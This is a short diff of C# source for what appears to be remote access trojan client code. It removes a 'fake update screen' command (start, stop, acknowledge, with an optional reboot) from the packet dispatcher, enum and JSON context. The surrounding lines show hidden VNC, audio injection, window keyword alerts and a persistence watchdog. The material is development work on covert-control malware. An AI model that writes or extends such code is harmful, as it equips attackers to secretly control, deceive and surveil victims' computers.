@@ -1042,23 +1042,6 @@ internal class TlsClient : IDisposable
                     _ = Task.Run(() => SpeakerFeature.Stop());
                     break;
 
-                // ── Fake Update Screen ───────────────────────────────
-                case PacketType.FakeUpdateStart:
-                {
-                    var fu  = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.FakeUpdateStartDataStub);
-                    var dur = fu?.DurationMinutes ?? 0;
-                    var reb = fu?.RebootAfter ?? false;
-                    _ = Task.Run(async () => await WritePacketAsync(new Packet
-                    {
-                        Type = PacketType.FakeUpdateAck,
-                        Data = FakeUpdateFeature.Start(dur, reb)
-                    }, CancellationToken.None));
-                    break;
-                }
-                case PacketType.FakeUpdateStop:
-                    _ = Task.Run(() => FakeUpdateFeature.Stop());
-                    break;
-
                 case PacketType.Disconnect:
                     ShouldReconnect = false;
                     Persistence.StopWatchdog();
@@ -2450,10 +2433,6 @@ internal enum PacketType
     WindowNotifyKeywords = 282,
     WindowNotifyAlert    = 283,
 
-    FakeUpdateStart = 284,
-    FakeUpdateStop  = 285,
-    FakeUpdateAck   = 286,
-
     FmSearch       = 186,
     FmSearchResult = 187,
 
@@ -2757,9 +2736,6 @@ internal class HvncProgressDataStub
 [JsonSerializable(typeof(SpeakerDataStub))]
 [JsonSerializable(typeof(SpeakerInjectStartDataStub))]
 [JsonSerializable(typeof(List<SpeakerDeviceStub>))]
-// Fake Update
-[JsonSerializable(typeof(FakeUpdateStartDataStub))]
-[JsonSerializable(typeof(FakeUpdateAckStub))]
 internal partial class SeroJson : JsonSerializerContext { }
 
 internal class CdpSignupStatusStub { public string Step { get; set; } = ""; public string Message { get; set; } = ""; }
